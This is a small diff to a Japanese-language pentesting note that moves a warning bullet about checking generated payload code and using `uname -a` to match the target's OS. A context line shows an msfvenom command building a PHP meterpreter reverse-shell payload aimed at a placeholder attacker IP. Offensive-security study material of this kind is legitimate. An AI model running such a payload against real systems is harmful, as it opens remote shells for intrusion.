@@ -108,5 +108,5 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f raw 
 > [!WARNING]
 > - 出力されたコードの一部に問題がある場合があるので検証すること（例：PHPで `<?php` がコメントアウトされているなど）
 > - 常に内容を確認し、必要があれば手動で修正すること
-- 
-- `uname -a` でターゲットマシンの OS・アーキテクチャを確認し、それに適したペイロードを選ぶこと
+> - `uname -a` でターゲットマシンの OS・アーキテクチャを確認し、それに適したペイロードを選ぶこと
+
